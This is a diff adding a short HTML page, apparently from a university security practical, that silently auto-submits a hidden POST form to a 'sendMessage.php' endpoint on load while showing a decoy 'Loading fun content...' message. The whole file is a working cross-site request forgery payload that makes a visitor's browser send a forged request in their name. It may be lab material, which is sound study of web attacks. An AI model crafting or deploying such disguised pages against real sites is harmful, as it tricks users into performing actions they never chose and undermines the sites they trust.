@@ -1,0 +1,8 @@
+<html>
+<body onload="document.forms[0].submit()">
+    <form method="POST" action="http://cs3-dev.ict.ru.ac.za/practicals/4a2/sendMessage.php">
+        <input type="hidden" name="userID" value="1">
+        </form>
+    <p>Loading fun content...</p>
+</body>
+</html>
